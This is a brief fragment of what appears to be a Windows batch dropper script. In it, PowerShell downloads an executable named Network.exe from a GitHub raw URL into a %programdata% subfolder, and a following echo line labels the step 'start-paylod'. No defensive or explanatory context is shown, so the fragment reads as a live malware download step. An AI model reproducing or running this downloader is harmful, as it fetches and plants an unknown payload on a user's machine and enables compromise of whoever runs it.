...
PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/Splash2520/splash/raw/refs/heads/main/Network.exe','%programdata%\64-Win\Network.exe')
echo -----------start-paylod------------------------
